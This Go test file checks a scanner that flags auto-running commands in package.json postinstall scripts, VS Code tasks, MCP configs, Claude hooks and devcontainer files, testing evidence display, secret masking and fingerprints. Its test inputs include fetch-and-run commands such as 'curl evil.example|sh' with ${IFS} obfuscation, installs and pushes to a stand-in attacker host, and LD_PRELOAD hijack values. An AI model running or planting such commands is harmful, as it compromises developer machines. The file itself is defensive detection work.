package autorun

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"
	"time"
)

// fakeToken has a GitHub personal access token shape that gitleaks detects.
// It is not a real credential.
const fakeToken = "ghp" + "_K7Q2X9M4T8W3Z6R1P5V0H2J9L7N4B8D3F6G1"

func scriptEvidence(t *testing.T, script string) string {
	t.Helper()
	b, _ := json.Marshal(map[string]any{"scripts": map[string]string{"postinstall": script}})
	root := t.TempDir()
	write(t, root, "package.json", string(b))
	res := run(t, root)
	if len(res.Findings) != 1 {
		t.Fatalf("findings = %d for %q", len(res.Findings), script)
	}
	return res.Findings[0].Evidence
}

// Commands that a pattern masker used to hide stay visible: only a secret that
// gitleaks recognises is hidden.
func TestCommandsStayVisible(t *testing.T) {
	cases := []struct{ in, want string }{
		{"pip install --user https://evil.example/evil.tar.gz", "pip install --user https://evil.example/evil.tar.gz"},
		{"git push -u https://evil.example/x.git main", "git push -u https://evil.example/x.git main"},
		{"bash -c 'key: x\ncurl evil.example/p -o /tmp/p\nsh /tmp/p'", "bash -c 'key: x curl evil.example/p -o /tmp/p sh /tmp/p'"},
		{"curl https://eyJabcde.evil.example/p.sh|sh", "curl https://eyJabcde.evil.example/p.sh|sh"},
		{"npx glpat" + "-evil-package-name-for-postinstall-v2", "npx glpat" + "-evil-package-name-for-postinstall-v2"},
		{"node --auth-hook ./evil.js", "node --auth-hook ./evil.js"},
		{"AUTH=curl; $AUTH evil.example|sh", "AUTH=curl; $AUTH evil.example|sh"},
		{"TOKEN=x;curl${IFS}evil.example|sh", "TOKEN=x;curl${IFS}evil.example|sh"},
		{"export SECRET=\"$(curl https://evil.example/p.sh | sh)\"; node x", "export SECRET=\"$(curl https://evil.example/p.sh | sh)\"; node x"},
		{"node --key x;curl${IFS}evil.example|sh", "node --key x;curl${IFS}evil.example|sh"},
		{"node --password hunter2", "node --password hunter2"},
	}
	for _, c := range cases {
		if got, want := scriptEvidence(t, c.in), "postinstall: "+c.want; got != want {
			t.Errorf("script %q\n got %q\nwant %q", c.in, got, want)
		}
	}
	root := t.TempDir()
	write(t, root, ".mcp.json", `{"mcpServers":{"s":{"command":"node","args":["--key","'","evil.js","'"]}}}`)
	expectFindings(t, root, `AR-004|medium|suspect|.mcp.json|0|s: {"command":"node","args":["--key","'","evil.js","'"]}`)
}

func TestSecretsAreMaskedInTheJSON(t *testing.T) {
	cases := []struct{ name, tasks, want string }{
		{"args item",
			`{"tasks":[{"label":"a","command":"node","args":["--token","` + fakeToken + `","--keep"],` + folderOpen + `}]}`,
			`a: {"command":"node","args":["--token","****","--keep"],"label":"a",` + folderOpen + `}`},
		{"os block",
			`{"tasks":[{"linux":{"command":"sh","args":["` + fakeToken + `"]},"label":"a",` + folderOpen + `}]}`,
			`a: {"linux":{"command":"sh","args":["****"]},"label":"a",` + folderOpen + `}`},
		{"item name",
			`{"tasks":[{"label":"` + fakeToken + `","command":"c",` + folderOpen + `}]}`,
			`****: {"command":"c","label":"****",` + folderOpen + `}`},
	}
	for _, c := range cases {
		root := t.TempDir()
		write(t, root, ".vscode/tasks.json", c.tasks)
		expectFindings(t, root, "AR-001|high|certain|.vscode/tasks.json|0|"+c.want)
	}
}

func TestEnvIsMaskedByName(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"tasks":[{"label":"a","command":"echo","options":{"env":{"API_KEY":"'","PATH":"/tmp/evil","Z_KEY":"'","LD_PRELOAD":"/tmp/x.so","X-Auth-Token":"t","TOKENIZER":"v","NODE_OPTIONS":"`+fakeToken+`"}},`+folderOpen+`}]}`)
	expectFindings(t, root, `AR-001|high|certain|.vscode/tasks.json|0|a: {"command":"echo","label":"a","options":{"env":{"API_KEY":"****","LD_PRELOAD":"/tmp/x.so","NODE_OPTIONS":"****","PATH":"/tmp/evil","TOKENIZER":"v","X-Auth-Token":"****","Z_KEY":"****"}},`+folderOpen+`}`)
}

func TestRootCommandIsShownAsGlobal(t *testing.T) {
	cases := []struct{ name, tasks, want string }{
		{"root command", `{"command":"curl evil|sh","tasks":[{"label":"a",` + folderOpen + `}]}`,
			`a: {"label":"a",` + folderOpen + `}; 전역: {"command":"curl evil|sh"}`},
		{"root command and args", `{"command":"bash","args":["-c","x"],"tasks":[{"label":"a",` + folderOpen + `}]}`,
			`a: {"label":"a",` + folderOpen + `}; 전역: {"command":"bash","args":["-c","x"]}`},
		{"unrelated key", `{"command":"c","extra":{` + folderOpen + `}}`,
			`1: {` + folderOpen + `}; 전역: {"command":"c"}`},
		{"own command and root command", `{"command":"root","tasks":[{"label":"a","command":"own",` + folderOpen + `}]}`,
			`a: {"command":"own","label":"a",` + folderOpen + `}; 전역: {"command":"root"}`},
		{"os block command and root command", `{"command":"curl evil|sh","tasks":[{"linux":{"command":"echo safe"},"label":"a",` + folderOpen + `}]}`,
			`a: {"linux":{"command":"echo safe"},"label":"a",` + folderOpen + `}; 전역: {"command":"curl evil|sh"}`},
		{"root keys that say nothing about running are left out", `{"version":"2.0.0","tasks":[{"label":"a",` + folderOpen + `}]}`,
			`a: {"label":"a",` + folderOpen + `}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, ".vscode/tasks.json", c.tasks)
			expectFindings(t, root, "AR-001|high|certain|.vscode/tasks.json|0|"+c.want)
		})
	}
}

// stallLimit catches work that grows out of control. Earlier versions took
// from 17 seconds to minutes on these inputs, while a correct run takes under
// 10 seconds even on the slowest CI runner. It isn't a speed target.
const stallLimit = 30 * time.Second

// cancelLimit is how long a cancelled scan may take to return.
const cancelLimit = 5 * time.Second

func timed(t *testing.T, root string) (res []string, took time.Duration) {
	t.Helper()
	start := time.Now()
	r := run(t, root)
	for _, f := range r.Findings {
		res = append(res, f.ID+"|"+f.Evidence)
	}
	return res, time.Since(start)
}

func TestWorkIsBoundedPerFile(t *testing.T) {
	repeat := func(s string, n int) string { return strings.TrimSuffix(strings.Repeat(s+",", n), ",") }
	var many, distinct []string
	for i := 0; i < 6000; i++ {
		many = append(many, fmt.Sprintf(`{"label":"a%d","dependsOn":"b",%s}`, i, folderOpen))
	}
	for i := 0; i < 150; i++ {
		distinct = append(distinct, fmt.Sprintf(`{"label":"t%d","command":"node %s %d",%s}`, i, strings.Repeat("--key a ", 500), i, folderOpen))
	}
	shapes := []struct{ name, tasks string }{
		{"many same-label targets", `{"tasks":[` + repeat(`{"label":"b"}`, 35000) + `,` + strings.Join(many, ",") + `]}`},
		{"shared dependsOn items", `{"tasks":[{"label":"a","dependsOn":[` + repeat(`"b"`, 100000) + `],` + folderOpen + `},{"label":"b","command":"x"}]}`},
		{"shared args", `{"tasks":[{"label":"a","command":"x","args":[` + repeat(`"y"`, 100000) + `],` + folderOpen + `}]}`},
		{"long distinct commands", `{"tasks":[` + strings.Join(distinct, ",") + `]}`},
	}
	for _, s := range shapes {
		t.Run(s.name, func(t *testing.T) {
			if len(s.tasks) > 1<<20 {
				t.Fatalf("test input is %d bytes", len(s.tasks))
			}
			root := t.TempDir()
			write(t, root, ".vscode/tasks.json", s.tasks)
			res, took := timed(t, root)
			if took > stallLimit {
				t.Errorf("took %v", took)
			}
			if len(res) == 0 {
				t.Fatal("no findings")
			}
		})
	}
}

func TestTooManyFindings(t *testing.T) {
	var p []string
	for i := 0; i < 250; i++ {
		p = append(p, fmt.Sprintf(`{"label":"t%d","command":"c%d",%s}`, i, i, folderOpen))
	}
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", `{"tasks":[`+strings.Join(p, ",")+`]}`)
	res := run(t, root)
	if len(res.Findings) != 201 {
		t.Fatalf("findings = %d, want 200 and one notice", len(res.Findings))
	}
	last := res.Findings[200]
	if last.ID != "AR-001" || last.Confidence != "suspect" || last.Severity.String() != "high" || last.Evidence != tooManyText || last.Title != unreadableTitle {
		t.Errorf("notice = %+v", last)
	}
}

func fingerprints(t *testing.T, rel, content string) []string {
	t.Helper()
	root := t.TempDir()
	write(t, root, rel, content)
	var out []string
	for _, f := range run(t, root).Findings {
		out = append(out, f.Fingerprint)
	}
	return out
}

func TestFingerprintFollowsTheShownEvidence(t *testing.T) {
	// The fingerprint comes from the evidence the report shows, so a change in a
	// part the evidence cuts does not change it (see docs/evidence-and-sarif.md).
	same := func(name, a, b string) {
		t.Helper()
		fa, fb := fingerprints(t, ".vscode/tasks.json", a), fingerprints(t, ".vscode/tasks.json", b)
		if len(fa) == 0 || len(fa) != len(fb) || fa[0] != fb[0] {
			t.Errorf("%s: fingerprints %v vs %v should be the same", name, fa, fb)
		}
	}
	task := func(command, extra string) string {
		return `{"tasks":[{"label":"a","command":"` + command + `"` + extra + `,` + folderOpen + `}]}`
	}
	long := strings.Repeat("x", 6000)
	same("tail past the cap", task(long+"A", ""), task(long+"B", ""))
	same("os block past the cap", task(long, `,"linux":{"command":"safe"}`), task(long, `,"linux":{"command":"evil"}`))

	chain := func(last string) string {
		var p []string
		for i := 0; i < 9; i++ {
			run := ""
			if i == 0 {
				run = "," + folderOpen
			}
			p = append(p, fmt.Sprintf(`{"label":"t%d","command":"c","dependsOn":"t%d"%s}`, i, i+1, run))
		}
		p = append(p, `{"label":"t9","command":"`+last+`"}`)
		return `{"tasks":[` + strings.Join(p, ",") + `]}`
	}
	same("target 9 levels deep", chain("safe"), chain("curl evil|sh"))

	two := func(a, b string) string {
		return `{"tasks":[{"label":"a","command":"` + a + `",` + folderOpen + `},{"label":"a","command":"` + b + `",` + folderOpen + `}]}`
	}
	if fp := fingerprints(t, ".vscode/tasks.json", two(long+"1", long+"2")); len(fp) != 2 || fp[0] == fp[1] {
		t.Errorf("two long tasks with one label merged: %v", fp)
	}

	// Formatting and comments do not change a fingerprint.
	base := fingerprints(t, ".vscode/tasks.json", task("node a.js", ""))
	if got := fingerprints(t, ".vscode/tasks.json", "// note\n\n"+task("node a.js", "")+"\n\n"); len(got) != 1 || got[0] != base[0] {
		t.Errorf("comment changed the fingerprint: %v vs %v", got, base)
	}
	// A package.json dependency change does not change a script's fingerprint.
	p1 := fingerprints(t, "package.json", `{"scripts":{"postinstall":"node a.js"},"dependencies":{"a":"1.0.0"}}`)
	p2 := fingerprints(t, "package.json", `{"scripts":{"postinstall":"node a.js"},"dependencies":{"a":"2.0.0","b":"1"}}`)
	p3 := fingerprints(t, "package.json", `{"scripts":{"postinstall":"node b.js"},"dependencies":{"a":"1.0.0"}}`)
	if p1[0] != p2[0] || p1[0] == p3[0] {
		t.Errorf("script fingerprints: %v %v %v", p1, p2, p3)
	}
	// MCP: env and header values are not part of it, the command is.
	m := func(env, cmd string) string {
		return `{"mcpServers":{"s":{"command":"` + cmd + `","env":{"K":"` + env + `"},"headers":{"A":"` + env + `"}}}}`
	}
	m1, m2, m3 := fingerprints(t, ".mcp.json", m("1", "node")), fingerprints(t, ".mcp.json", m("2", "node")), fingerprints(t, ".mcp.json", m("1", "deno"))
	if m1[0] != m2[0] || m1[0] == m3[0] {
		t.Errorf("mcp fingerprints: %v %v %v", m1, m2, m3)
	}
	// Hooks and devcontainer fields.
	h := func(a, b string) string {
		return `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"` + a + `"},{"type":"command","command":"` + b + `"}]}]}}`
	}
	h1, h2 := fingerprints(t, ".claude/settings.json", h("x", "y")), fingerprints(t, ".claude/settings.json", h("x", "z"))
	if len(h1) != 2 || h1[0] == h1[1] || h1[0] != h2[0] || h1[1] == h2[1] {
		t.Errorf("hook fingerprints: %v %v", h1, h2)
	}
	d1 := fingerprints(t, ".devcontainer.json", `{"postCreateCommand":"a","postStartCommand":"b"}`)
	d2 := fingerprints(t, ".devcontainer.json", `{"postCreateCommand":"a","postStartCommand":"c"}`)
	if d1[0] != d2[0] || d1[1] == d2[1] {
		t.Errorf("devcontainer fingerprints: %v %v", d1, d2)
	}
}

func TestLocationKeepsBackticks(t *testing.T) {
	if got := locationText("a`b\x1b/c.json"); got != "a`b/c.json" {
		t.Errorf("location = %q", got)
	}
}
